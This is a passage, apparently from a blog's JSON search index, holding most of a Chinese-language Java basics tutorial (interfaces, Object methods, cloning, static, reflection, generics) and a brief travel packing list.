setId(String id) { this.id = Integer.valueOf(id); } } 但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。\npublic class AccessWithInnerClassExample { private class InnerClass { int x; } private InnerClass innerClass; public AccessWithInnerClassExample() { innerClass = new InnerClass(); } public int getValue() { return innerClass.x; // 直接访问  } } 抽象类与接口 1. 抽象类\n抽象类和抽象方法都使用 abstract 关键字进行声明。抽象类一般会包含抽象方法，抽象方法一定位于抽象类中。\n抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。\npublic abstract class AbstractClassExample { protected int x; private int y; public abstract void func1(); public void func2() { System.out.println(\u0026#34;func2\u0026#34;); } } public class AbstractExtendClassExample extends AbstractClassExample { @Override public void func1() { System.out.println(\u0026#34;func1\u0026#34;); } } // AbstractClassExample ac1 = new AbstractClassExample(); // \u0026#39;AbstractClassExample\u0026#39; is abstract; cannot be instantiated AbstractClassExample ac2 = new AbstractExtendClassExample(); ac2.func1(); 2. 接口\n接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。\n从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。\n接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。\n接口的字段默认都是 static 和 final 的。\npublic interface InterfaceExample { void func1(); default void func2(){ System.out.println(\u0026#34;func2\u0026#34;); } int x = 123; // int y; // Variable \u0026#39;y\u0026#39; might not have been initialized  public int z = 0; // Modifier \u0026#39;public\u0026#39; is redundant for interface fields  // private int k = 0; // Modifier \u0026#39;private\u0026#39; not allowed here  // protected int l = 0; // Modifier \u0026#39;protected\u0026#39; not allowed here  // private void fun3(); // Modifier \u0026#39;private\u0026#39; not allowed here } public class InterfaceImplementExample implements InterfaceExample { @Override public void func1() { System.out.println(\u0026#34;func1\u0026#34;); } } // InterfaceExample ie1 = new InterfaceExample(); // \u0026#39;InterfaceExample\u0026#39; is abstract; cannot be instantiated InterfaceExample ie2 = new InterfaceImplementExample(); ie2.func1(); System.out.println(InterfaceExample.x); 3. 比较\n 从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。  4. 使用选择\n使用接口：\n 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法； 需要使用多重继承。  使用抽象类：\n 需要在几个相关的类中共享代码。 需要能控制继承来的成员的访问权限，而不是都为 public。 需要继承非静态和非常量字段。  在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。\n 深入理解 abstract class 和 interface When to Use Abstract Class and Interface  super  访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而委托父类完成一些初始化的工作。 访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。  public class SuperExample { protected int x; protected int y; public SuperExample(int x, int y) { this.x = x; this.y = y; } public void func() { System.out.println(\u0026#34;SuperExample.func()\u0026#34;); } } public class SuperExtendExample extends SuperExample { private int z; public SuperExtendExample(int x, int y, int z) { super(x, y); this.z = z; } @Override public void func() { super.func(); System.out.println(\u0026#34;SuperExtendExample.func()\u0026#34;); } } SuperExample e = new SuperExtendExample(1, 2, 3); e.func(); SuperExample.func() SuperExtendExample.func() Using the Keyword super\n重写与重载 1. 重写（Override）\n存在于继承体系中，指子类实现了一个与父类在方法声明上完全相同的一个方法。\n为了满足里式替换原则，重写有有以下两个限制：\n 子类方法的访问权限必须大于等于父类方法； 子类方法的返回类型必须是父类方法返回类型或为其子类型。  使用 @Override 注解，可以让编译器帮忙检查是否满足上面的两个限制条件。\n2. 重载（Overload）\n存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是参数类型、个数、顺序至少有一个不同。\n应该注意的是，返回值不同，其它都相同不算是重载。\n五、Object 通用方法 概览 public native int hashCode() public boolean equals(Object obj) protected native Object clone() throws CloneNotSupportedException public String toString() public final native Class\u0026lt;?\u0026gt; getClass() protected void finalize() throws Throwable {} public final native void notify() public final native void notifyAll() public final native void wait(long timeout) throws InterruptedException public final void wait(long timeout, int nanos) throws InterruptedException public final void wait() throws InterruptedException equals() 1. 等价关系\nⅠ 自反性\nx.equals(x); // true Ⅱ 对称性\nx.equals(y) == y.equals(x); // true Ⅲ 传递性\nif (x.equals(y) \u0026amp;\u0026amp; y.equals(z)) x.equals(z); // true; Ⅳ 一致性\n多次调用 equals() 方法结果不变\nx.equals(y) == x.equals(y); // true Ⅴ 与 null 的比较\n对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false\nx.equals(null); // false; 2. 等价与相等\n 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。  Integer x = new Integer(1); Integer y = new Integer(1); System.out.println(x.equals(y)); // true System.out.println(x == y); // false 3. 实现\n 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 对象进行转型； 判断每个关键域是否相等。  public class EqualExample { private int x; private int y; private int z; public EqualExample(int x, int y, int z) { this.x = x; this.y = y; this.z = z; } @Override public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; } } hashCode() hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。\n在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。\n下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象，但是因为 EqualExample 没有实现 hasCode() 方法，因此这两个对象的散列值是不同的，最终导致集合添加了两个等价的对象。\nEqualExample e1 = new EqualExample(1, 1, 1); EqualExample e2 = new EqualExample(1, 1, 1); System.out.println(e1.equals(e2)); // true HashSet\u0026lt;EqualExample\u0026gt; set = new HashSet\u0026lt;\u0026gt;(); set.add(e1); set.add(e2); System.out.println(set.size()); // 2 理想的散列函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。\n一个数与 31 相乘可以转换成移位和减法：31*x == (x\u0026lt;\u0026lt;5)-x，编译器会自动进行这个优化。\n@Override public int hashCode() { int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result; } toString() 默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。\npublic class ToStringExample { private int number; public ToStringExample(int number) { this.number = number; } } ToStringExample example = new ToStringExample(123); System.out.println(example.toString()); ToStringExample@4554617c clone() 1. cloneable\nclone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。\npublic class CloneExample { private int a; private int b; } CloneExample e1 = new CloneExample(); // CloneExample e2 = e1.clone(); // \u0026#39;clone()\u0026#39; has protected access in \u0026#39;java.lang.Object\u0026#39; 重写 clone() 得到以下实现：\npublic class CloneExample { private int a; private int b; @Override public CloneExample clone() throws CloneNotSupportedException { return (CloneExample)super.clone(); } } CloneExample e1 = new CloneExample(); try { CloneExample e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } java.lang.CloneNotSupportedException: CloneExample 以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。\n应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。\npublic class CloneExample implements Cloneable { private int a; private int b; @Override public Object clone() throws CloneNotSupportedException { return super.clone(); } } 2. 浅拷贝\n拷贝对象和原始对象的引用类型引用同一个对象。\npublic class ShallowCloneExample implements Cloneable { private int[] arr; public ShallowCloneExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected ShallowCloneExample clone() throws CloneNotSupportedException { return (ShallowCloneExample) super.clone(); } } ShallowCloneExample e1 = new ShallowCloneExample(); ShallowCloneExample e2 = null; try { e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } e1.set(2, 222); System.out.println(e2.get(2)); // 222 3. 深拷贝\n拷贝对象和原始对象的引用类型引用不同对象。\npublic class DeepCloneExample implements Cloneable { private int[] arr; public DeepCloneExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } @Override protected DeepCloneExample clone() throws CloneNotSupportedException { DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i \u0026lt; arr.length; i++) { result.arr[i] = arr[i]; } return result; } } DeepCloneExample e1 = new DeepCloneExample(); DeepCloneExample e2 = null; try { e2 = e1.clone(); } catch (CloneNotSupportedException e) { e.printStackTrace(); } e1.set(2, 222); System.out.println(e2.get(2)); // 2 4. clone() 的替代方案\n使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。\npublic class CloneConstructorExample { private int[] arr; public CloneConstructorExample() { arr = new int[10]; for (int i = 0; i \u0026lt; arr.length; i++) { arr[i] = i; } } public CloneConstructorExample(CloneConstructorExample original) { arr = new int[original.arr.length]; for (int i = 0; i \u0026lt; original.arr.length; i++) { arr[i] = original.arr[i]; } } public void set(int index, int value) { arr[index] = value; } public int get(int index) { return arr[index]; } } CloneConstructorExample e1 = new CloneConstructorExample(); CloneConstructorExample e2 = new CloneConstructorExample(e1); e1.set(2, 222); System.out.println(e2.get(2)); // 2 六、关键字 final 1. 数据\n声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。\n 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。  final int x = 1; // x = 2; // cannot assign value to final variable \u0026#39;x\u0026#39; final A y = new A(); y.a = 1; 2. 方法\n声明方法不能被子类重写。\nprivate 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。\n3. 类\n声明类不允许被继承。\nstatic 1. 静态变量\n 静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。  public class A { private int x; // 实例变量  private static int y; // 静态变量  public static void main(String[] args) { // int x = A.x; // Non-static field \u0026#39;x\u0026#39; cannot be referenced from a static context  A a = new A(); int x = a.x; int y = A.y; } } 2. 静态方法\n静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。\npublic abstract class A { public static void func1(){ } // public abstract static void func2(); // Illegal combination of modifiers: \u0026#39;abstract\u0026#39; and \u0026#39;static\u0026#39; } 只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字。\npublic class A { private static int x; private int y; public static void func1(){ int a = x; // int b = y; // Non-static field \u0026#39;y\u0026#39; cannot be referenced from a static context  // int b = this.y; // \u0026#39;A.this\u0026#39; cannot be referenced from a static context  } } 3. 静态语句块\n静态语句块在类初始化时运行一次。\npublic class A { static { System.out.println(\u0026#34;123\u0026#34;); } public static void main(String[] args) { A a1 = new A(); A a2 = new A(); } } 123 4. 静态内部类\n非静态内部类依赖于外部类的实例，而静态内部类不需要。\npublic class OuterClass { class InnerClass { } static class StaticInnerClass { } public static void main(String[] args) { // InnerClass innerClass = new InnerClass(); // \u0026#39;OuterClass.this\u0026#39; cannot be referenced from a static context  OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); } } 静态内部类不能访问外部类的非静态的变量和方法。\n5. 静态导包\n在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。\nimport static com.xxx.ClassName.* 6. 初始化顺序\n静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。\npublic static String staticField = \u0026#34;静态变量\u0026#34;; static { System.out.println(\u0026#34;静态语句块\u0026#34;); } public String field = \u0026#34;实例变量\u0026#34;; { System.out.println(\u0026#34;普通语句块\u0026#34;); } 最后才是构造函数的初始化。\npublic InitialOrderTest() { System.out.println(\u0026#34;构造函数\u0026#34;); } 存在继承的情况下，初始化顺序为：\n 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数）  七、反射 每个类都有一个 Class 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。\n类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 Class.forName(\u0026quot;com.mysql.jdbc.Driver\u0026quot;) 这种方式来控制类的加载，该方法会返回一个 Class 对象。\n反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。\nClass 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类：\n Field ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段； Method ：可以使用 invoke() 方法调用与 Method 对象关联的方法； Constructor ：可以用 Constructor 创建新的对象。  Advantages of Using Reflection:\n Extensibility Features : An application may make use of external, user-defined classes by creating instances of extensibility objects using their fully-qualified names. Class Browsers and Visual Development Environments : A class browser needs to be able to enumerate the members of classes. Visual development environments can benefit from making use of type information available in reflection to aid the developer in writing correct code. Debuggers and Test Tools : Debuggers need to be able to examine private members on classes. Test harnesses can make use of reflection to systematically call a discoverable set APIs defined on a class, to insure a high level of code coverage in a test suite.  Drawbacks of Reflection:\nReflection is powerful, but should not be used indiscriminately. If it is possible to perform an operation without using reflection, then it is preferable to avoid using it. The following concerns should be kept in mind when accessing code via reflection.\n  Performance Overhead : Because reflection involves types that are dynamically resolved, certain Java virtual machine optimizations can not be performed. Consequently, reflective operations have slower performance than their non-reflective counterparts, and should be avoided in sections of code which are called frequently in performance-sensitive applications.\n  Security Restrictions : Reflection requires a runtime permission which may not be present when running under a security manager. This is in an important consideration for code which has to run in a restricted security context, such as in an Applet.\n  Exposure of Internals :Since reflection allows code to perform operations that would be illegal in non-reflective code, such as accessing private fields and methods, the use of reflection can result in unexpected side-effects, which may render code dysfunctional and may destroy portability. Reflective code breaks abstractions and therefore may change behavior with upgrades of the platform.\n  Trail: The Reflection API\n  深入解析 Java 反射（1）- 基础\n  八、异常 Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种：\n 受检异常 ：需要用 try\u0026hellip;catch\u0026hellip; 语句捕获并进行处理，并且可以从异常中恢复； 非受检异常 ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。   Java 入门之异常处理 Java 异常的面试问题及答案 -Part 1  九、泛型 public class Box\u0026lt;T\u0026gt; { // T stands for \u0026#34;Type\u0026#34;  private T t; public void set(T t) { this.t = t; } public T get() { return t; } }  Java 泛型详解 10 道 Java 泛型面试题  十、注解 Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。\n注解 Annotation 实现原理与自定义注解例子\n十一、特性 Java 各版本的新特性 New highlights in Java SE 8\n Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed  New highlights in Java SE 7\n Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax   Difference between Java 1.8 and Java 1.7? Java 8 特性  Java 与 C++ 的区别  Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。 Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。 Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。 Java 支持自动垃圾回收，而 C++ 需要手动回收。 Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。 Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。 Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。 Java 不支持条件编译，C++ 通过 #ifdef #ifndef 等预处理命令从而实现条件编译。  What are the main differences between Java and C++?\nJRE or JDK  JRE is the JVM program, Java application need to run on JRE. JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler \u0026ldquo;javac\u0026rdquo;  参考资料  Eckel B. Java 编程思想[M]. 机械工业出版社, 2002. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.  ","permalink":"https://www.fenghong.tech/blog/java/java-basic/","tags":["java"],"title":"Java basic"},{"categories":["living"],"contents":"[TOC]\n短途旅行 1. 手机 2. 充电宝及充电线 3. 身份证或者护照 4. 洗发水、牙膏牙刷、毛巾 5. 洗面奶、爽肤水、乳液、面霜、防晒霜、补水喷雾 6. 眼罩和耳塞、湿巾和纸巾 7. 耳机 8. 换洗衣服 9. 卫生用品(女生) 长途旅行 ","permalink":"https://www.fenghong.tech/blog/living/gofortarvel/","tags":["food"],"title":"just for travel"}]